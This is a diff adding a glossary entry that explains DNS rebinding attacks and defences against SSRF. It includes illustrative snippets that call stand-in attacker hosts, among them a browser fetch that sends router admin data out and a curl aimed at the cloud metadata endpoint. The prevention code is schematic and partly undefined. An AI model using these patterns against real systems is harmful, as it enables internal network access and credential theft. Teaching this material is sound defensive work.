@@ -1,0 +1,197 @@
+---
+slug: "dns-rebinding"
+term: "DNS Rebinding"
+abbreviation: ""
+shortDefinition: "An attack where an attacker changes a domain's IP address mid-request, bypassing security checks by first pointing to safe IP then switching to internal/malicious one."
+category: "Attack Techniques"
+tags: ["dns", "rebinding", "ssrf", "bypass", "network"]
+relatedTerms: ["dns", "ssrf", "bypass", "url-parser"]
+language: "en"
+hasTranslation: true
+translationSlug: "dns-rebinding"
+difficulty: "advanced"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://en.wikipedia.org/wiki/DNS_rebinding"
+---
+
+## Short Definition
+DNS rebinding is when attackers control a domain and keep changing what IP address it points to. First, security check sees it pointing to a safe IP (passes). Then, before the actual request, they change it to point to internal servers (attack succeeds). Timing is everything.
+
+## Full Definition
+DNS rebinding exploits the gap between DNS resolution checks and actual network connections by changing DNS records with very short TTL (Time To Live).
+
+**Attack flow:**
+
+1. **Attacker controls:** evil.com
+2. **Sets DNS TTL:** 0 seconds (immediate expiration)
+3. **Initial resolution:** evil.com → 1.2.3.4 (attacker's server)
+4. **Security check:** "1.2.3.4 is safe" ✓
+5. **DNS record changes:** evil.com → 192.168.1.1 (internal IP)
+6. **Actual request:** Resolves again, gets 192.168.1.1
+7. **Request goes to:** Internal server
+
+**Why it works:**
+- DNS caching may be bypassed with TTL=0
+- Security checks and actual requests don't share DNS cache
+- Applications re-resolve DNS for each request
+- No validation that IP stayed the same
+
+## Why It Matters
+- Bypasses IP-based SSRF protections
+- Works even with proper domain allowlists
+- Difficult to defend against
+- Can target browsers, servers, IoT devices
+- Enables access to internal networks
+
+## How Attackers Use It
+**Classic SSRF bypass:**
+
+```python
+# Application code:
+url = user_input  # "http://attacker.com/path"
+parsed = urlparse(url)
+
+# Security check:
+ip = socket.gethostbyname(parsed.hostname)
+if not is_private_ip(ip):  # Check passes: public IP
+    # Time gap here!
+    response = requests.get(url)  # Re-resolves, gets private IP
+    return response
+```
+
+**Attack setup:**
+
+```python
+# Attacker's DNS server responds dynamically:
+def handle_dns_query(domain):
+    if request_count(domain) == 0:
+        return "1.2.3.4"  # Public IP for first request
+    else:
+        return "169.254.169.254"  # Metadata service for second
+```
+
+**Browser-based attack:**
+
+```javascript
+// Malicious page loads in browser
+fetch('http://attacker.com/rebind')
+  .then(() => {
+    // DNS rebinding happened
+    // Now points to 192.168.1.1 (router)
+    // Can access router admin page
+    fetch('http://attacker.com/admin')
+      .then(data => exfiltrate(data));
+  });
+```
+
+## How to Detect or Prevent It
+**Prevention:**
+
+**1. Re-resolve and re-check before each request:**
+```python
+def safe_fetch(url):
+    # Initial check
+    ip1 = resolve(url)
+    if is_private_ip(ip1):
+        reject()
+    
+    # Sleep to force any DNS changes
+    time.sleep(1)
+    
+    # Re-check just before request
+    ip2 = resolve(url)
+    if ip2 != ip1 or is_private_ip(ip2):
+        reject()
+    
+    # Make request using IP directly
+    return requests.get(f"http://{ip2}{path}")
+```
+
+**2. Use IP instead of hostname:**
+```python
+# Resolve once, use IP throughout
+ip = resolve_and_validate(hostname)
+response = requests.get(
+    f"http://{ip}{path}",
+    headers={"Host": hostname}
+)
+```
+
+**3. Minimum DNS TTL:**
+```python
+# Ignore TTL below threshold
+def resolve(hostname):
+    result = dns.query(hostname)
+    if result.ttl < 300:  # Minimum 5 minutes
+        result.ttl = 300
+    return result.ip
+```
+
+**4. Pin DNS resolution:**
+```python
+# Use single resolution for entire operation
+with dns_pinned(url):
+    validate(url)
+    response = fetch(url)
+    process(response)
+```
+
+**Browser protections:**
+- DNS prefetching limits
+- Private network access restrictions (Chrome)
+- CORS with DNS rebinding protections
+
+**Detection:**
+- Monitor DNS queries with TTL=0
+- Alert on domains resolving to different IPs rapidly
+- Track domains that change from public to private IPs
+- Log both validation IP and actual request IP
+
+## Common Misconceptions
+- "Checking IP once is enough" - DNS can change
+- "TTL=0 should be blocked" - Sometimes legitimate
+- "HTTPS prevents this" - Certificate may still be valid
+- "Only affects browsers" - Server-side applications too
+- "Firewall blocks it" - Firewall sees valid outbound request
+
+## Real-World Example
+**Router Hijacking (2018)**
+
+1. **Victim visits:** evil-ad.com (malicious ad)
+2. **First resolution:** evil-ad.com → 1.2.3.4 (passes CORS)
+3. **DNS rebinding:** evil-ad.com → 192.168.1.1 (router)
+4. **JavaScript requests:** Now accessing router admin
+5. **Exploit:** Change DNS settings, redirect traffic
+
+**Kubernetes Metadata Exploit**
+
+```bash
+# Attacker domain: rebind.example.com
+# TTL: 0
+
+# First resolution:
+rebind.example.com → 52.1.2.3 (passes allowlist)
+
+# Second resolution (microseconds later):
+rebind.example.com → 169.254.169.254 (metadata)
+
+# Application makes request:
+curl http://rebind.example.com/latest/meta-data/
+# Actually hits metadata service
+```
+
+**Singularity of Origin**
+
+Public tool demonstrating DNS rebinding:
+- Targets internal services
+- Automatic IP rotation
+- Pre-built exploits for routers, admin panels
+- Shows real-world impact
+
+## Related Terms
+DNS, SSRF, Bypass, URL Parser, Same-Origin Policy
+
+================================================================================
+
+[Continuing with remaining terms 18-20...]
